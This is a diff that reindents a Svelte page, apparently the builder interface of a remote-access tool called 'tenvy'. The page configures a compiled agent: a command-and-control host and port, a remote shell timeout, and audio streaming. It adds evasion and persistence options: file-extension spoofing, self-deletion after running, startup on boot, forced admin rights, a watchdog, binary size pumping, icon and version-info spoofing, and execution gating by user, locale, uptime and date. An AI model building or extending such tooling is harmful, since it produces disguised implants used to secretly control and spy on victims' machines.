@@ -2,45 +2,45 @@
 	import { browser } from '$app/environment';
 	import { Badge } from '$lib/components/ui/badge/index.js';
 	import { Button } from '$lib/components/ui/button/index.js';
-        import {
-                Card,
-                CardContent,
-                CardDescription,
-                CardHeader,
-                CardTitle
-        } from '$lib/components/ui/card/index.js';
-        import { Tabs, TabsContent, TabsList, TabsTrigger } from '$lib/components/ui/tabs/index.js';
-        import { onDestroy, onMount, tick } from 'svelte';
-        import { SvelteSet } from 'svelte/reactivity';
-        import { toast } from 'svelte-sonner';
-        import ConnectionTab from './components/ConnectionTab.svelte';
-        import {
-                ANTI_TAMPER_BADGES,
-                ARCHITECTURE_OPTIONS_BY_OS,
-                DEFAULT_FILE_INFORMATION,
-                EXTENSION_OPTIONS_BY_OS,
-                EXTENSION_SPOOF_PRESETS,
-                type CookieKV,
-                type ExtensionSpoofPreset,
-                type FilePumperUnit,
-                type HeaderKV,
-                type TargetArch,
-                type TargetOS
-        } from './lib/constants.js';
-        import {
-                addCustomCookie as createCustomCookie,
-                addCustomHeader as createCustomHeader,
-                generateMutexName as randomMutexSuffix,
-                normalizeSpoofExtension,
-                removeCustomCookie as deleteCustomCookie,
-                removeCustomHeader as deleteCustomHeader,
-                sanitizeMutexName,
-                updateCustomCookie as writeCustomCookie,
-                updateCustomHeader as writeCustomHeader,
-                validateSpoofExtension,
-                withPresetSpoofExtension
-        } from './lib/utils.js';
-        import { prepareBuildRequest } from './lib/build-request.js';
+	import {
+		Card,
+		CardContent,
+		CardDescription,
+		CardHeader,
+		CardTitle
+	} from '$lib/components/ui/card/index.js';
+	import { Tabs, TabsContent, TabsList, TabsTrigger } from '$lib/components/ui/tabs/index.js';
+	import { onDestroy, onMount, tick } from 'svelte';
+	import { SvelteSet } from 'svelte/reactivity';
+	import { toast } from 'svelte-sonner';
+	import ConnectionTab from './components/ConnectionTab.svelte';
+	import {
+		ANTI_TAMPER_BADGES,
+		ARCHITECTURE_OPTIONS_BY_OS,
+		DEFAULT_FILE_INFORMATION,
+		EXTENSION_OPTIONS_BY_OS,
+		EXTENSION_SPOOF_PRESETS,
+		type CookieKV,
+		type ExtensionSpoofPreset,
+		type FilePumperUnit,
+		type HeaderKV,
+		type TargetArch,
+		type TargetOS
+	} from './lib/constants.js';
+	import {
+		addCustomCookie as createCustomCookie,
+		addCustomHeader as createCustomHeader,
+		generateMutexName as randomMutexSuffix,
+		normalizeSpoofExtension,
+		removeCustomCookie as deleteCustomCookie,
+		removeCustomHeader as deleteCustomHeader,
+		sanitizeMutexName,
+		updateCustomCookie as writeCustomCookie,
+		updateCustomHeader as writeCustomHeader,
+		validateSpoofExtension,
+		withPresetSpoofExtension
+	} from './lib/utils.js';
+	import { prepareBuildRequest } from './lib/build-request.js';
 
 	type BuildStatus = 'idle' | 'running' | 'success' | 'error';
 
@@ -95,124 +95,122 @@
 	let customHeaders = $state<HeaderKV[]>([{ key: '', value: '' }]);
 	let customCookies = $state<CookieKV[]>([{ name: '', value: '' }]);
 	let audioStreamingEnabled = $state(false);
-        let audioStreamingTouched = $state(false);
-        type BuildTab = 'connection' | 'persistence' | 'execution' | 'presentation';
-        const DEFAULT_TAB: BuildTab = 'connection';
-        let activeTab = $state<BuildTab>(DEFAULT_TAB);
+	let audioStreamingTouched = $state(false);
+	type BuildTab = 'connection' | 'persistence' | 'execution' | 'presentation';
+	const DEFAULT_TAB: BuildTab = 'connection';
+	let activeTab = $state<BuildTab>(DEFAULT_TAB);
 
-        type TabComponent = typeof ConnectionTab;
-        type TabLoader = () => Promise<{ default: TabComponent }>;
+	type TabComponent = typeof ConnectionTab;
+	type TabLoader = () => Promise<{ default: TabComponent }>;
 
-        const TAB_COMPONENT_LOADERS: Record<BuildTab, TabLoader> = {
-                connection: async () => ({ default: ConnectionTab }),
-                persistence: () => import('./components/PersistenceTab.svelte'),
-                execution: () => import('./components/ExecutionTab.svelte'),
-                presentation: () => import('./components/PresentationTab.svelte')
-        };
+	const TAB_COMPONENT_LOADERS: Record<BuildTab, TabLoader> = {
+		connection: async () => ({ default: ConnectionTab }),
+		persistence: () => import('./components/PersistenceTab.svelte'),
+		execution: () => import('./components/ExecutionTab.svelte'),
+		presentation: () => import('./components/PresentationTab.svelte')
+	};
 
-        let tabComponents = $state<Partial<Record<BuildTab, TabComponent>>>({
-                connection: ConnectionTab
-        });
-        let tabLoading = $state<Record<BuildTab, boolean>>({
-                connection: false,
-                persistence: false,
-                execution: false,
-                presentation: false
-        });
-        let tabErrors = $state<Record<BuildTab, string | null>>({
-                connection: null,
-                persistence: null,
-                execution: null,
-                presentation: null
-        });
+	let tabComponents = $state<Partial<Record<BuildTab, TabComponent>>>({
+		connection: ConnectionTab
+	});
+	let tabLoading = $state<Record<BuildTab, boolean>>({
+		connection: false,
+		persistence: false,
+		execution: false,
+		presentation: false
+	});
+	let tabErrors = $state<Record<BuildTab, string | null>>({
+		connection: null,
+		persistence: null,
+		execution: null,
+		presentation: null
+	});
 
-        async function loadTabComponent(tab: BuildTab) {
-                if (tabComponents[tab]) {
-                        tabErrors = { ...tabErrors, [tab]: null };
-                        return tabComponents[tab];
-                }
+	async function loadTabComponent(tab: BuildTab) {
+		if (tabComponents[tab]) {
+			tabErrors = { ...tabErrors, [tab]: null };
+			return tabComponents[tab];
+		}
 
-                if (tabLoading[tab]) {
-                        return;
-                }
+		if (tabLoading[tab]) {
+			return;
+		}
 
-                tabLoading = { ...tabLoading, [tab]: true };
-                tabErrors = { ...tabErrors, [tab]: null };
+		tabLoading = { ...tabLoading, [tab]: true };
+		tabErrors = { ...tabErrors, [tab]: null };
 
-                try {
-                        const module = await TAB_COMPONENT_LOADERS[tab]();
-                        tabComponents = { ...tabComponents, [tab]: module.default };
-                        return module.default;
-                } catch (error) {
-                        console.error('Failed to load tab component', tab, error);
-                        const message =
-                                error instanceof Error
-                                        ? error.message
-                                        : 'Failed to load tab. Please try again.';
-                        tabErrors = { ...tabErrors, [tab]: message };
-                } finally {
-                        tabLoading = { ...tabLoading, [tab]: false };
-                }
-        }
+		try {
+			const module = await TAB_COMPONENT_LOADERS[tab]();
+			tabComponents = { ...tabComponents, [tab]: module.default };
+			return module.default;
+		} catch (error) {
+			console.error('Failed to load tab component', tab, error);
+			const message =
+				error instanceof Error ? error.message : 'Failed to load tab. Please try again.';
+			tabErrors = { ...tabErrors, [tab]: message };
+		} finally {
+			tabLoading = { ...tabLoading, [tab]: false };
+		}
+	}
 
-        function prefetchDefaultTab() {
-                if (!tabComponents[DEFAULT_TAB]) {
-                        return loadTabComponent(DEFAULT_TAB);
-                }
+	function prefetchDefaultTab() {
+		if (!tabComponents[DEFAULT_TAB]) {
+			return loadTabComponent(DEFAULT_TAB);
+		}
 
-                return Promise.resolve(tabComponents[DEFAULT_TAB]);
-        }
+		return Promise.resolve(tabComponents[DEFAULT_TAB]);
+	}
 
-        const idleApi = globalThis as typeof globalThis & {
-                requestIdleCallback?: (callback: IdleRequestCallback, options?: IdleRequestOptions) => number;
-                cancelIdleCallback?: (handle: number) => void;
-        };
+	const idleApi = globalThis as typeof globalThis & {
+		requestIdleCallback?: (callback: IdleRequestCallback, options?: IdleRequestOptions) => number;
+		cancelIdleCallback?: (handle: number) => void;
+	};
 
-        let idlePrefetchHandle: number | null = null;
-        let idlePrefetchTimeout: ReturnType<typeof setTimeout> | null = null;
+	let idlePrefetchHandle: number | null = null;
+	let idlePrefetchTimeout: ReturnType<typeof setTimeout> | null = null;
 
-        function scheduleIdlePrefetch() {
-                const runPrefetch = () => {
-                        (['persistence', 'execution', 'presentation'] satisfies BuildTab[]).forEach((tab) => {
-                                void loadTabComponent(tab);
-                        });
-                };
+	function scheduleIdlePrefetch() {
+		const runPrefetch = () => {
+			(['persistence', 'execution', 'presentation'] satisfies BuildTab[]).forEach((tab) => {
+				void loadTabComponent(tab);
+			});
+		};
 
-                if (typeof idleApi.requestIdleCallback === 'function') {
-                        idlePrefetchHandle = idleApi.requestIdleCallback(() => {
-                                idlePrefetchHandle = null;
-                                runPrefetch();
-                        });
-                        return;
-                }
+		if (typeof idleApi.requestIdleCallback === 'function') {
+			idlePrefetchHandle = idleApi.requestIdleCallback(() => {
+				idlePrefetchHandle = null;
+				runPrefetch();
+			});
+			return;
+		}
 
-                idlePrefetchTimeout = setTimeout(() => {
-                        idlePrefetchTimeout = null;
-                        runPrefetch();
-                });
-        }
+		idlePrefetchTimeout = setTimeout(() => {
+			idlePrefetchTimeout = null;
+			runPrefetch();
+		});
+	}
 
-        if (browser) {
-                onMount(() => {
-                        prefetchDefaultTab()
-                                .catch(() => undefined)
-                                .then(() => {
-                                        scheduleIdlePrefetch();
-                                });
-                });
-        }
+	if (browser) {
+		onMount(() => {
+			prefetchDefaultTab()
+				.catch(() => undefined)
+				.then(() => {
+					scheduleIdlePrefetch();
+				});
+		});
+	}
 
-        onDestroy(() => {
-                if (idlePrefetchHandle !== null && typeof idleApi.cancelIdleCallback === 'function') {
-                        idleApi.cancelIdleCallback(idlePrefetchHandle);
-                        idlePrefetchHandle = null;
-                }
+	onDestroy(() => {
+		if (idlePrefetchHandle !== null && typeof idleApi.cancelIdleCallback === 'function') {
+			idleApi.cancelIdleCallback(idlePrefetchHandle);
+			idlePrefetchHandle = null;
+		}
 
-                if (idlePrefetchTimeout !== null) {
-                        clearTimeout(idlePrefetchTimeout);
-                        idlePrefetchTimeout = null;
-                }
-        });
+		if (idlePrefetchTimeout !== null) {
+			clearTimeout(idlePrefetchTimeout);
+			idlePrefetchTimeout = null;
+		}
+	});
 
 	const KNOWN_EXTENSION_SUFFIXES = Array.from(
 		new Set(
@@ -280,38 +278,38 @@
 	let downloadUrl = $state<string | null>(null);
 	let outputPath = $state<string | null>(null);
 
-        const BUILD_STATUS_TOAST_ID = 'build-status-toast';
-        const BUILD_PROGRESS_TOAST_ID = 'build-progress-toast';
+	const BUILD_STATUS_TOAST_ID = 'build-status-toast';
+	const BUILD_PROGRESS_TOAST_ID = 'build-progress-toast';
 
-        function clearBuildToasts() {
-                if (!browser) {
-                        return;
-                }
+	function clearBuildToasts() {
+		if (!browser) {
+			return;
+		}
 
-                toast.dismiss(BUILD_STATUS_TOAST_ID);
-                toast.dismiss(BUILD_PROGRESS_TOAST_ID);
-        }
+		toast.dismiss(BUILD_STATUS_TOAST_ID);
+		toast.dismiss(BUILD_PROGRESS_TOAST_ID);
+	}
 
 	let lastToastedStatus: BuildStatus = 'idle';
 	let lastWarningSignature = '';
 
 	let isBuilding = $derived(buildStatus === 'running');
 
-        if (browser) {
-                onMount(() => {
-                        void prefetchDefaultTab();
-                });
-        } else {
-                void prefetchDefaultTab();
-        }
+	if (browser) {
+		onMount(() => {
+			void prefetchDefaultTab();
+		});
+	} else {
+		void prefetchDefaultTab();
+	}
 
-        $effect(() => {
-                void loadTabComponent(activeTab);
-        });
+	$effect(() => {
+		void loadTabComponent(activeTab);
+	});
 
-        const markAudioStreamingTouched = () => {
-                audioStreamingTouched = true;
-        };
+	const markAudioStreamingTouched = () => {
+		audioStreamingTouched = true;
+	};
 
 	$effect(() => {
 		const allowedExtensions = EXTENSION_OPTIONS_BY_OS[targetOS] ?? EXTENSION_OPTIONS_BY_OS.windows;
@@ -437,15 +435,15 @@
 		lastWarningSignature = signature;
 	});
 
-        function resetProgress() {
-                buildStatus = 'idle';
-                buildError = null;
-                downloadUrl = null;
-                outputPath = null;
-                buildWarnings = [];
-                fileIconError = null;
-                clearBuildToasts();
-        }
+	function resetProgress() {
+		buildStatus = 'idle';
+		buildError = null;
+		downloadUrl = null;
+		outputPath = null;
+		buildWarnings = [];
+		fileIconError = null;
+		clearBuildToasts();
+	}
 
 	function pushProgress(text: string, tone: 'info' | 'success' | 'error' = 'info') {
 		if (!browser) {
@@ -531,10 +529,10 @@
 		customCookies = updated.length > 0 ? updated : [{ name: '', value: '' }];
 	}
 
-        function assignMutexName(length = 16) {
-                const suffix = randomMutexSuffix(length).toUpperCase();
-                mutexName = sanitizeMutexName(`Global\\tenvy-${suffix}`);
-        }
+	function assignMutexName(length = 16) {
+		const suffix = randomMutexSuffix(length).toUpperCase();
+		mutexName = sanitizeMutexName(`Global\\tenvy-${suffix}`);
+	}
 
 	async function handleIconSelection(event: Event) {
 		const input = event.target as HTMLInputElement;
@@ -593,101 +591,101 @@
 		fileIconError = null;
 	}
 
-        async function buildAgent() {
-                if (buildStatus === 'running') {
-                        return;
-                }
+	async function buildAgent() {
+		if (buildStatus === 'running') {
+			return;
+		}
 
-                resetProgress();
+		resetProgress();
 
-                const buildResult = prepareBuildRequest({
-                        host,
-                        port,
-                        effectiveOutputFilename,
-                        outputExtension,
-                        targetOS,
-                        targetArch,
-                        installationPath,
-                        meltAfterRun,
-                        startupOnBoot,
-                        developerMode,
-                        mutexName,
-                        compressBinary,
-                        forceAdmin,
-                        pollIntervalMs,
-                        maxBackoffMs,
-                        shellTimeoutSeconds,
-                        customHeaders,
-                        customCookies,
-                        watchdogEnabled,
-                        watchdogIntervalSeconds,
-                        enableFilePumper,
-                        filePumperTargetSize,
-                        filePumperUnit,
-                        executionDelaySeconds,
-                        executionMinUptimeMinutes,
-                        executionAllowedUsernames,
-                        executionAllowedLocales,
-                        executionStartDate,
-                        executionEndDate,
-                        executionRequireInternet,
-                        audioStreamingTouched,
-                        audioStreamingEnabled,
-                        fileIconName,
-                        fileIconData,
-                        fileInformation,
-                        isWindowsTarget
-                });
+		const buildResult = prepareBuildRequest({
+			host,
+			port,
+			effectiveOutputFilename,
+			outputExtension,
+			targetOS,
+			targetArch,
+			installationPath,
+			meltAfterRun,
+			startupOnBoot,
+			developerMode,
+			mutexName,
+			compressBinary,
+			forceAdmin,
+			pollIntervalMs,
+			maxBackoffMs,
+			shellTimeoutSeconds,
+			customHeaders,
+			customCookies,
+			watchdogEnabled,
+			watchdogIntervalSeconds,
+			enableFilePumper,
+			filePumperTargetSize,
+			filePumperUnit,
+			executionDelaySeconds,
+			executionMinUptimeMinutes,
+			executionAllowedUsernames,
+			executionAllowedLocales,
+			executionStartDate,
+			executionEndDate,
+			executionRequireInternet,
+			audioStreamingTouched,
+			audioStreamingEnabled,
+			fileIconName,
+			fileIconData,
+			fileInformation,
+			isWindowsTarget
+		});
 
-                if (!buildResult.ok) {
-                        buildError = buildResult.error;
-                        pushProgress(buildError, 'error');
-                        buildStatus = 'error';
-                        return;
-                }
+		if (!buildResult.ok) {
+			buildError = buildResult.error;
+			pushProgress(buildError, 'error');
+			buildStatus = 'error';
+			return;
+		}
 
-                const { payload, warnings: preflightWarnings } = buildResult;
+		const { payload, warnings: preflightWarnings } = buildResult;
 
-                buildWarnings = [...preflightWarnings];
-                buildStatus = 'running';
-                await tick();
-                pushProgress('Preparing build request...');
+		buildWarnings = [...preflightWarnings];
+		buildStatus = 'running';
+		await tick();
+		pushProgress('Preparing build request...');
 
-                try {
-                        pushProgress('Dispatching build to compiler environment...');
-                        const response = await fetch('/api/build', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify(payload)
-                        });
+		try {
+			pushProgress('Dispatching build to compiler environment...');
+			const response = await fetch('/api/build', {
+				method: 'POST',
+				headers: { 'Content-Type': 'application/json' },
+				body: JSON.stringify(payload)
+			});
 
-                        const result = (await response.json()) as BuildResponse;
-                        const responseWarnings = result.warnings ?? [];
-                        buildWarnings = [...preflightWarnings, ...responseWarnings];
+			const result = (await response.json()) as BuildResponse;
+			const responseWarnings = result.warnings ?? [];
+			buildWarnings = [...preflightWarnings, ...responseWarnings];
 
-                        if (!response.ok || !result.success) {
-                                const message = result.message || 'Failed to build agent.';
-                                throw new Error(message);
-                        }
+			if (!response.ok || !result.success) {
+				const message = result.message || 'Failed to build agent.';
+				throw new Error(message);
+			}
 
-                        pushProgress('Compilation completed. Finalizing artifacts...');
+			pushProgress('Compilation completed. Finalizing artifacts...');
 
-                        downloadUrl = result.downloadUrl ?? null;
-                        outputPath = result.outputPath ?? null;
+			downloadUrl = result.downloadUrl ?? null;
+			outputPath = result.outputPath ?? null;
 
-                        buildStatus = 'success';
-                        pushProgress('Agent binary is ready.', 'success');
-                        notifySharedSecret(result.sharedSecret ?? null);
-                } catch (err) {
-                        buildStatus = 'error';
-                        buildError = err instanceof Error ? err.message : 'Unknown build error.';
-                        pushProgress(buildError, 'error');
-                }
-        }
+			buildStatus = 'success';
+			pushProgress('Agent binary is ready.', 'success');
+			notifySharedSecret(result.sharedSecret ?? null);
+		} catch (err) {
+			buildStatus = 'error';
+			buildError = err instanceof Error ? err.message : 'Unknown build error.';
+			pushProgress(buildError, 'error');
+		}
+	}
 
-        onDestroy(() => {
-                clearBuildToasts();
-        });
+	onDestroy(() => {
+		clearBuildToasts();
+	});
 </script>
 
 <div class="mx-auto w-full space-y-6 px-4 pb-10">
@@ -731,119 +729,111 @@
 							>
 						</TabsList>
 
-                                                <TabsContent value="connection" class="space-y-6">
-                                                        {#if tabComponents.connection}
-                                                                <svelte:component
-                                                                        this={tabComponents.connection}
-                                                                        bind:host
-                                                                        bind:port
-                                                                        bind:outputFilename
-                                                                        {effectiveOutputFilename}
-                                                                        bind:targetOS
-                                                                        bind:targetArch
-                                                                        bind:outputExtension
-                                                                        bind:extensionSpoofingEnabled
-                                                                        bind:extensionSpoofPreset
-                                                                        bind:extensionSpoofCustom
-                                                                        {extensionSpoofError}
-                                                                        bind:pollIntervalMs
-                                                                        bind:maxBackoffMs
-                                                                        bind:shellTimeoutSeconds
-                                                                        {customHeaders}
-                                                                        {customCookies}
-                                                                        bind:audioStreamingEnabled
-                                                                        {audioStreamingTouched}
-                                                                        {markAudioStreamingTouched}
-                                                                        {addCustomHeader}
-                                                                        {updateCustomHeader}
-                                                                        {removeCustomHeader}
-                                                                        {addCustomCookie}
-                                                                        {updateCustomCookie}
-                                                                        {removeCustomCookie}
-                                                                />
-                                                        {:else if tabErrors.connection}
-                                                                <p class="text-sm text-destructive">
-                                                                        {tabErrors.connection}
-                                                                </p>
-                                                        {:else}
-                                                                <p class="text-xs text-muted-foreground">
-                                                                        Loading connection options…
-                                                                </p>
-                                                        {/if}
-                                                </TabsContent>
-                                                <TabsContent value="persistence" class="space-y-6">
-                                                        {#if tabComponents.persistence}
-                                                                <svelte:component
-                                                                        this={tabComponents.persistence}
-                                                                        bind:installationPath
-                                                                        bind:mutexName
-                                                                        bind:meltAfterRun
-                                                                        bind:startupOnBoot
-                                                                        bind:developerMode
-                                                                        bind:compressBinary
-                                                                        bind:forceAdmin
-                                                                        bind:watchdogEnabled
-                                                                        bind:watchdogIntervalSeconds
-                                                                        bind:enableFilePumper
-                                                                        bind:filePumperTargetSize
-                                                                        bind:filePumperUnit
-                                                                        {applyInstallationPreset}
-                                                                        {assignMutexName}
-                                                                />
-                                                        {:else if tabErrors.persistence}
-                                                                <p class="text-sm text-destructive">
-                                                                        {tabErrors.persistence}
-                                                                </p>
-                                                        {:else}
-                                                                <p class="text-xs text-muted-foreground">
-                                                                        Loading persistence options…
-                                                                </p>
-                                                        {/if}
-                                                </TabsContent>
-                                                <TabsContent value="execution" class="space-y-6">
-                                                        {#if tabComponents.execution}
-                                                                <svelte:component
-                                                                        this={tabComponents.execution}
-                                                                        bind:executionDelaySeconds
-                                                                        bind:executionMinUptimeMinutes
-                                                                        bind:executionAllowedUsernames
-                                                                        bind:executionAllowedLocales
-                                                                        bind:executionStartDate
-                                                                        bind:executionEndDate
-                                                                        bind:executionRequireInternet
-                                                                />
-                                                        {:else if tabErrors.execution}
-                                                                <p class="text-sm text-destructive">
-                                                                        {tabErrors.execution}
-                                                                </p>
-                                                        {:else}
-                                                                <p class="text-xs text-muted-foreground">
-                                                                        Loading execution options…
-                                                                </p>
-                                                        {/if}
-                                                </TabsContent>
-                                                <TabsContent value="presentation" class="space-y-6">
-                                                        {#if tabComponents.presentation}
-                                                                <svelte:component
-                                                                        this={tabComponents.presentation}
-                                                                        {fileIconName}
-                                                                        {fileIconError}
-                                                                        {handleIconSelection}
-                                                                        {clearIconSelection}
-                                                                        {isWindowsTarget}
-                                                                        bind:fileInformationOpen
-                                                                        {fileInformation}
-                                                                />
-                                                        {:else if tabErrors.presentation}
-                                                                <p class="text-sm text-destructive">
-                                                                        {tabErrors.presentation}
-                                                                </p>
-                                                        {:else}
-                                                                <p class="text-xs text-muted-foreground">
-                                                                        Loading presentation options…
-                                                                </p>
-                                                        {/if}
-                                                </TabsContent>
+						<TabsContent value="connection" class="space-y-6">
+							{#if tabComponents.connection}
+								<svelte:component
+									this={tabComponents.connection}
+									bind:host
+									bind:port
+									bind:outputFilename
+									{effectiveOutputFilename}
+									bind:targetOS
+									bind:targetArch
+									bind:outputExtension
+									bind:extensionSpoofingEnabled
+									bind:extensionSpoofPreset
+									bind:extensionSpoofCustom
+									{extensionSpoofError}
+									bind:pollIntervalMs
+									bind:maxBackoffMs
+									bind:shellTimeoutSeconds
+									{customHeaders}
+									{customCookies}
+									bind:audioStreamingEnabled
+									{audioStreamingTouched}
+									{markAudioStreamingTouched}
+									{addCustomHeader}
+									{updateCustomHeader}
+									{removeCustomHeader}
+									{addCustomCookie}
+									{updateCustomCookie}
+									{removeCustomCookie}
+								/>
+							{:else if tabErrors.connection}
+								<p class="text-sm text-destructive">
+									{tabErrors.connection}
+								</p>
+							{:else}
+								<p class="text-xs text-muted-foreground">Loading connection options…</p>
+							{/if}
+						</TabsContent>
+						<TabsContent value="persistence" class="space-y-6">
+							{#if tabComponents.persistence}
+								<svelte:component
+									this={tabComponents.persistence}
+									bind:installationPath
+									bind:mutexName
+									bind:meltAfterRun
+									bind:startupOnBoot
+									bind:developerMode
+									bind:compressBinary
+									bind:forceAdmin
+									bind:watchdogEnabled
+									bind:watchdogIntervalSeconds
+									bind:enableFilePumper
+									bind:filePumperTargetSize
+									bind:filePumperUnit
+									{applyInstallationPreset}
+									{assignMutexName}
+								/>
+							{:else if tabErrors.persistence}
+								<p class="text-sm text-destructive">
+									{tabErrors.persistence}
+								</p>
+							{:else}
+								<p class="text-xs text-muted-foreground">Loading persistence options…</p>
+							{/if}
+						</TabsContent>
+						<TabsContent value="execution" class="space-y-6">
+							{#if tabComponents.execution}
+								<svelte:component
+									this={tabComponents.execution}
+									bind:executionDelaySeconds
+									bind:executionMinUptimeMinutes
+									bind:executionAllowedUsernames
+									bind:executionAllowedLocales
+									bind:executionStartDate
+									bind:executionEndDate
+									bind:executionRequireInternet
+								/>
+							{:else if tabErrors.execution}
+								<p class="text-sm text-destructive">
+									{tabErrors.execution}
+								</p>
+							{:else}
+								<p class="text-xs text-muted-foreground">Loading execution options…</p>
+							{/if}
+						</TabsContent>
+						<TabsContent value="presentation" class="space-y-6">
+							{#if tabComponents.presentation}
+								<svelte:component
+									this={tabComponents.presentation}
+									{fileIconName}
+									{fileIconError}
+									{handleIconSelection}
+									{clearIconSelection}
+									{isWindowsTarget}
+									bind:fileInformationOpen
+									{fileInformation}
+								/>
+							{:else if tabErrors.presentation}
+								<p class="text-sm text-destructive">
+									{tabErrors.presentation}
+								</p>
+							{:else}
+								<p class="text-xs text-muted-foreground">Loading presentation options…</p>
+							{/if}
+						</TabsContent>
 					</Tabs>
 				</div>
 				<aside class="space-y-4 xl:sticky xl:top-24">
